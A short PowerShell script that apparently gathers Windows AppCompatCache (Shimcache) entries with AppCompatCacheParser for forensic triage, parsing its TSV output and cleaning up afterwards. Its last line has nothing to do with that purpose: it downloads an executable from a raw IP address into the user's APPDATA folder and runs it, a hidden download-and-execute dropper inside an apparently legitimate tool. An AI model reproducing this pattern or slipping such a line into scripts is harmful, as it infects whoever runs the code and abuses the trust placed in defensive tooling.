



$AppCompatCacheParserPath = ($env:SystemRoot + "\AppCompatCacheParser.exe")
$Runtime = ([String] (Get-Date -Format yyyyMMddHHmmss))
$suppress = New-Item -Name "ACCP-$($Runtime)" -ItemType Directory -Path $env:Temp -Force
$AppCompatCacheParserOutputPath = $($env:Temp + "\ACCP-$($Runtime)")

if (Test-Path ($AppCompatCacheParserPath)) {
    
    $suppress = & $AppCompatCacheParserPath --csv $AppCompatCacheParserOutputPath

    
    Import-Csv -Delimiter "`t" "$AppCompatCacheParserOutputPath\*.tsv"
    
    
    $suppress = Remove-Item $AppCompatCacheParserOutputPath -Force -Recurse
        
} else {
    Write-Error "AppCompatCacheParser.exe not found on $env:COMPUTERNAME"
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

